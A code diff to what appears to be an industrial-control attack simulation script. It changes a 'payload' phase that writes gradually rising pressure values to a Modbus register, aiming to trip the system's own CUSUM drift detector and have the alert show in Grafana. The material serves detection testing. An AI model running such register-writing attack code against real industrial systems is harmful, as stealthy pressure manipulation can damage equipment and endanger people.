@@ -334,8 +334,9 @@ def phase4_exploit(targets: dict):
 # ─────────────────────────────────────────────────────────────────────────────
 def phase5_payload(targets: dict):
     banner("PHASE 5: PAYLOAD DELIVERY — Sustained Stealth Pressure Drift")
-    warn("Slowly incrementing pressure by 3 PSI every 5s over 45s")
-    warn("Goal: trigger EWMA/CUSUM STEALTH_DRIFT_EWMA without sudden spike")
+    warn("Slowly incrementing pressure by 5 PSI every 5s over 75s (15 steps)")
+    warn("Goal: trigger EWMA/CUSUM STEALTH_DRIFT_EWMA without a sudden spike")
+    warn("CUSUM threshold = 65.0, slack k = 4.0 — needs sustained cumulative drift")
     host = targets["modbus"]
     if not HAS_MODBUS:
         warn("pymodbus not available — cannot execute this phase")
@@ -350,14 +351,17 @@ def phase5_payload(targets: dict):
         base_pressure = rr.registers[0] if not rr.isError() else 120
 
         print(f"  Base pressure: {base_pressure} PSI")
-        for step in range(9):   # 9 steps × 5s = 45s total
-            new_pressure = base_pressure + (step + 1) * 3
+        # 15 steps × 5 PSI × 5s = 75s — enough to saturate CUSUM past 65.0
+        for step in range(15):
+            new_pressure = base_pressure + (step + 1) * 5
             client.write_register(REG_PRESSURE, value=new_pressure)
-            print(f"  Step {step+1}/9: pressure → {new_pressure} PSI")
+            print(f"  Step {step+1}/15: pressure → {new_pressure} PSI  "
+                  f"(+{(step+1)*5} PSI above base)")
             time.sleep(5)
 
-        result("Payload complete", "CUSUM drift should now exceed threshold (40.0)")
+        result("Payload complete", "CUSUM accumulator should exceed threshold (65.0)")
         print("  Check Grafana: security_alerts should show STEALTH_DRIFT_EWMA")
+        print("  If not yet fired, wait 10-15s for next ML cycle to run.")
     finally:
         client.close()
 
